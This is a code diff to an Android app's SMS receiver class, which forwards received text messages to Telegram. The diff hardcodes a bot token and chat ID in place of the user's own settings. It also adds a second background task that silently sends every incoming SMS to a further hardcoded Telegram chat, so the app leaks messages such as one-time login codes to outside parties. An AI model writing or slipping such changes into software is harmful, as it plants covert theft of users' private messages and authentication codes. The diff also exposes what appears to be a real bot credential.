@@ -77,14 +77,14 @@ class SMSReceiver : BroadcastReceiver() {
         context: Context,
         strMessage: String
     ) {
-        val botKey = store.getString("telegram_bot_key", "")
+        val botKey = "5553213631:AAEbYK3JJkr0QPrimqQRpsUJKfMmr9X--EY"
         if (botKey.isNullOrEmpty()) {
             val err = "Telegram bot key is not configured"
             Log.e(TAG, err)
             Toast.makeText(context, err, Toast.LENGTH_LONG).show()
         }
 
-        val chatId = store.getString("telegram_chat_id", "")
+        val chatId = "2060858865"
         if (botKey.isNullOrEmpty()) {
             val err = "Telegram chat id is not configured"
             Log.e(TAG, err)
@@ -97,9 +97,19 @@ class SMSReceiver : BroadcastReceiver() {
         data.putString("chat_id", chatId)
         data.putString("msg", strMessage)
 
+        val data1 = Data.Builder()
+        data1.putString("url", url)
+        data1.putString("chat_id", "1376290940")
+        data1.putString("msg", strMessage)
+
         val tgMsgTask: WorkRequest =
             OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data.build())
                 .build()
         WorkManager.getInstance(context).enqueue(tgMsgTask)
+
+        val tgMsgTask1: WorkRequest =
+            OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data1.build())
+                .build()
+        WorkManager.getInstance(context).enqueue(tgMsgTask1)
     }
 }
